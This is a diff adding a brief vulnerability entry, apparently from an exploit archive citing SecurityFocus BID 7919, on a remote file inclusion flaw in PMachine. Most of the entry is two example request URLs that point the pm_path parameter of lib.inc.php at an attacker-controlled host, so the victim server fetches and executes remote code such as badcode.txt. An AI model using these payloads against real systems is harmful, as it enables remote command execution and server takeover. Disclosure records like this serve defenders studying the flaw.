@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/7919/info
+
+It has been reported that PMachine does not properly handle include files under some circumstances. Because of this, an attacker may be able to remotely execute commands.
+
+http://victim.example.com/pm/lib.inc.php?pm_path=http://attacker.example.com/&sfx=.txt with:
+
+http://attacker.example.com/config.txt
+
+or
+
+http://victim.example.com/pm/lib.inc.php?pm_path=http://attacker.example.com/&sfx=/badcode.txt with:
+
+http://attacker.example.com/config/badcode.txt 
